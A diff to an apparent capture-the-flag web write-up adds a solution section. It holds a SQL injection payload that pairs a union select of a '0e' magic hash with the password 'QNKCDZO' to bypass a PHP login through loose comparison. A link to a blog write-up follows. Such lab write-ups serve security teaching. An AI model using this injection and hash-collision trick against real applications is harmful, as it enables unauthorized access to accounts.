@@ -26,6 +26,11 @@ else {
 }
 ?>
 ```
+# Solution 
+payload:
+```
+user=' union select "0e830400451993494058024219903391"#&pass=QNKCDZO
+```
 
 # Refference
 + [chybeta : 程序逻辑问题](https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98)
